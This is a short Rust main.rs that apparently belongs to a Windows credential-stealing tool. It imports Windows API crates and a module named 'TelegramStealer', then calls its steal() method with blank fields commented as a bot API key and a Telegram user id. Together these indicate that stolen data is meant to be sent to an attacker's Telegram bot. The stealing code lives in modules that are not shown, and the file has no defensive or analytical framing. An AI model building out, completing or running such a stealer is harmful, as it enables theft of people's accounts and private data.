extern crate user32;
extern crate winapi;

pub mod core;
pub mod utils;
use crate::core::TelegramStealer;

fn main() {
    TelegramStealer::new(
        "".to_string(), // bot api key
        "".to_string(), // id telegram user
    )
    .steal()
    .unwrap();
}